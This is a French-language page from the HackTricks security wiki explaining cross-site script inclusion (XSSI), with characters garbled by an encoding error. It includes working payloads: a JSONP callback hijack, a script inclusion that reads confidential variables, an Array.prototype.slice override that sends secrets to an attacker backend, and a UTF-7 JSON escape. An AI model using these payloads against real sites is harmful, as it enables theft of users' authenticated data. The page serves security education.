# XSSI (Inclusion de script entre sites)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>


## Informations de base

**L'inclusion de script entre sites (XSSI)** est une vuln√©rabilit√© qui d√©coule de la nature de la balise `script` en HTML. Contrairement √† la plupart des ressources, qui sont soumises √† la **Politique de m√™me origine (SOP)**, les scripts peuvent √™tre inclus √† partir de diff√©rents domaines. Ce comportement est destin√© √† faciliter l'utilisation de biblioth√®ques et d'autres ressources h√©berg√©es sur des serveurs diff√©rents, mais introduit √©galement un risque potentiel pour la s√©curit√©.

### Caract√©ristiques cl√©s de **XSSI** :
- **Contournement de la SOP** : Les scripts sont exempt√©s de la **Politique de m√™me origine**, ce qui leur permet d'√™tre inclus √† travers les domaines.
- **Exposition des donn√©es** : Un attaquant peut exploiter ce comportement pour lire des donn√©es charg√©es via la balise `script`.
- **Impact sur JavaScript dynamique/JSONP** : **XSSI** est particuli√®rement pertinent pour le JavaScript dynamique ou le **JSON avec rembourrage (JSONP)**. Ces technologies utilisent souvent des informations "d'autorit√© ambiante" (comme les cookies) pour l'authentification. Lorsqu'une demande de script est faite √† un h√¥te diff√©rent, ces informations d'identification (par exemple, les cookies) sont automatiquement incluses dans la demande.
- **Fuite de jeton d'authentification** : Si un attaquant peut tromper le navigateur d'un utilisateur pour qu'il demande un script √† un serveur qu'il contr√¥le, il pourrait acc√©der √† des informations sensibles contenues dans ces demandes.

### Types

1. **JavaScript statique** - Repr√©sente la forme conventionnelle de XSSI.
2. **JavaScript statique avec authentification** - Ce type est distinct car il n√©cessite une authentification pour y acc√©der.
3. **JavaScript dynamique** - Implique du JavaScript qui g√©n√®re dynamiquement du contenu.
4. **Non-JavaScript** - Fait r√©f√©rence √† des vuln√©rabilit√©s qui n'impliquent pas directement JavaScript.

**Les informations suivantes sont un r√©sum√© de [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)**. Consultez-le pour plus de d√©tails.


### XSSI r√©gulier
Dans cette approche, des informations priv√©es sont int√©gr√©es dans un fichier JavaScript accessible mondialement. Les attaquants peuvent identifier ces fichiers en utilisant des m√©thodes telles que la lecture de fichiers, les recherches de mots-cl√©s ou les expressions r√©guli√®res. Une fois localis√©, le script contenant des informations priv√©es peut √™tre inclus dans un contenu malveillant, permettant un acc√®s non autoris√© √† des donn√©es sensibles. Une technique d'exploitation exemple est pr√©sent√©e ci-dessous:
```html
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script> alert(JSON.stringify(confidential_keys[0])); </script>
```
### Dynamic-JavaScript-based-XSSI and Authenticated-JavaScript-XSSI
Ces types d'attaques XSSI impliquent l'ajout dynamique d'informations confidentielles au script en r√©ponse √† une requ√™te de l'utilisateur. La d√©tection peut √™tre effectu√©e en envoyant des requ√™tes avec et sans cookies et en comparant les r√©ponses. Si les informations diff√®rent, cela peut indiquer la pr√©sence d'informations confidentielles. Ce processus peut √™tre automatis√© en utilisant des outils comme l'extension Burp [DetectDynamicJS](https://github.com/luh2/DetectDynamicJS).

Si des donn√©es confidentielles sont stock√©es dans une variable globale, elles peuvent √™tre exploit√©es en utilisant des m√©thodes similaires √† celles utilis√©es dans XSSI r√©gulier. Cependant, si les donn√©es confidentielles sont incluses dans une r√©ponse JSONP, les attaquants peuvent d√©tourner la fonction de rappel pour r√©cup√©rer les informations. Cela peut √™tre fait en manipulant des objets globaux ou en configurant une fonction √† ex√©cuter par la r√©ponse JSONP, comme d√©montr√© ci-dessous:
```html
<script>
var angular = function () { return 1; };
angular.callbacks = function () { return 1; };
angular.callbacks._7 = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```

```html
<script>
leak = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
Pour les variables ne r√©sidant pas dans l'espace de noms global, *la falsification de prototype* peut parfois √™tre exploit√©e. Cette technique exploite la conception de JavaScript, o√π l'interpr√©tation du code implique de parcourir la cha√Æne de prototype pour localiser la propri√©t√© appel√©e. En rempla√ßant certaines fonctions, telles que `slice` de `Array`, les attaquants peuvent acc√©der et divulguer des variables non globales:
```javascript
Array.prototype.slice = function(){
// leaks ["secret1", "secret2", "secret3"]
sendToAttackerBackend(this);
};
```
Des d√©tails suppl√©mentaires sur les vecteurs d'attaque peuvent √™tre trouv√©s dans le travail du chercheur en s√©curit√© [Sebastian Lekies](https://twitter.com/slekies), qui maintient une liste de [vecteurs](http://sebastian-lekies.de/leak/).

### Non-Script-XSSI
La recherche de Takeshi Terada introduit une autre forme de XSSI, o√π des fichiers Non-Script, tels que CSV, sont divulgu√©s en cross-origin en √©tant inclus en tant que sources dans une balise `script`. Les exemples historiques de XSSI, tels que l'attaque de 2006 de Jeremiah Grossman pour lire un carnet d'adresses complet de Google et la fuite de donn√©es JSON de 2007 de Joe Walker, soulignent la gravit√© de ces menaces. De plus, Gareth Heyes d√©crit une variante d'attaque impliquant du JSON encod√© en UTF-7 pour √©chapper au format JSON et ex√©cuter des scripts, efficace dans certains navigateurs:
```javascript
[{'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'}]
```

```html
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```
<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

D'autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
